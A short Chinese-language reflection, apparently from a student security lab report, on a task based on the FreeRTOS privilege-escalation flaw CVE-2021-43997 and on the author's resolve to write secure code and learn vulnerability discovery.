- 任务`3`的现实基础是于`2021`年年底被初步修复的`CVE-2021-43997`漏洞。这个漏洞的存在使得只要能够控制程序的执行流，就能轻易地通过调用提权函数完成提权，进而完成其他特权操作。这是一个刚被报告不久的漏洞，即使我之前对嵌入式设备、`FreeRTOS`等概念没有任何了解，但我也可以从应用层次理解这个漏洞利用的方式和可能带来的后果，说明这个漏洞并不是一个很难被发现的漏洞。从这个漏洞的存在可推知，众多的开源项目中一定存在着许多其他尚未被发现的漏洞，他们其中的任何一个都可能带来比这个漏洞更恶劣的结果。因此，一方面，作为一名代码的生产者，虽然我的能力还远不足以完成操作系统的架构及编写，但在日常和未来工作的代码编写中，应该为自己编写的代码的安全性负责，培养良好的架构和编码意识；另一方面，作为安全方向的学习者，在平时的学习过程中也应该培养善于发现漏洞的能力，为保障计算机世界的安全助力。